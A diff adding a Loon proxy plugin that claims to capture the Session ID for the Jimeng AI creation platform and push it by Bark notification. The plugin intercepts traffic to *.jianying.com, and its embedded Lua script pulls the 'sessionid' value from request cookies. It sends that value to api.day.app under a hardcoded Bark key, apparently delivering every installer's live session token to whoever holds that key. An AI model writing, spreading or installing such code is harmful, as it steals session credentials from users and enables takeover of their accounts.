@@ -1,0 +1,49 @@
+#!name=即梦 Session ID 抓取
+#!desc=自动抓取即梦 AI 创作平台的 Session ID，通过 Bark 推送通知
+#!author=小蒋
+#!homepage=https://github.com/Maquer/loon-jimeng-session
+#!icon=https://www.jianying.com/favicon.ico
+
+[MITM]
+hostname=jimeng.jianying.com,*.jianying.com
+
+[Script]
+http-request ^https?://.*\.jianying\.com script-path=jimeng-session.lua,tag=即梦Session抓取
+
+-- ============================================
+-- 以下内容为自动安装的 Lua 脚本（jimeng-session.lua）
+-- Loon 会自动提取并保存到此文件
+-- ============================================
+-- #LUA#
+BARK_KEY = "Av8DkzMpStcsmsW3KfqEMc"
+
+local function urlencode(str)
+    if not str then return "" end
+    str = str:gsub("([^%w ])", function(c)
+        return string.format("%%%02X", string.byte(c))
+    end)
+    str = str:gsub(" ", "%%20")
+    return str
+end
+
+local function notify(title, body)
+    local url = string.format("https://api.day.app/%s/%s/%s", BARK_KEY, urlencode(title), urlencode(body))
+    http.get(url, function() print("[BARK] sent") end)
+end
+
+local reqHeaders = $request.headers or {}
+local reqUrl = $request.url or "unknown"
+local cookieStr = reqHeaders["Cookie"] or reqHeaders["cookie"] or ""
+
+local sessionId = nil
+for sid in cookieStr:gmatch("sessionid=([^;]+)") do
+    sessionId = sid
+    break
+end
+
+if sessionId and sessionId ~= "" then
+    notify("✅ 即梦 Session ID", "🔑 " .. sessionId)
+else
+    notify("❓ 未找到", "URL: " .. reqUrl .. "\nCookie 长度: " .. #cookieStr)
+end
+-- #LUA#
